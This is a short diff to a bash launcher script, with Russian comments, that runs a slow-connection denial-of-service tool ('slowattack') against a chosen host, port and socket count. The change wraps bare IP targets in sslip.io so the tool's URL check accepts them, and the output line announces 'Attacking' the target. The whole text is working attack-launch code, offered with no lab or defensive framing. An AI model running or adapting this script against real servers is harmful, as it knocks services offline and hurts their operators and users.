@@ -24,10 +24,17 @@ if [ "$PORT" = "443" ]; then
     PROTO="https"
 fi
 
+# slowattack требует URL с доменной зоной (regex не пропускает голый IP) -
+# заворачиваем IP в sslip.io, который резолвится обратно в тот же IP
+URL_HOST="$HOST"
+if [[ "$HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    URL_HOST="${HOST}.sslip.io"
+fi
+
 ARGS=(-p "$PORT" -s "$SOCKETS")
 if [ -n "$DURATION" ]; then
     ARGS+=(-t "$DURATION")
 fi
 
-echo "[+] Атакую $PROTO://$HOST:$PORT, сокетов: $SOCKETS"
-slowattack "${ARGS[@]}" "$PROTO://$HOST"
+echo "[+] Атакую $PROTO://$URL_HOST:$PORT, сокетов: $SOCKETS"
+slowattack "${ARGS[@]}" "$PROTO://$URL_HOST"
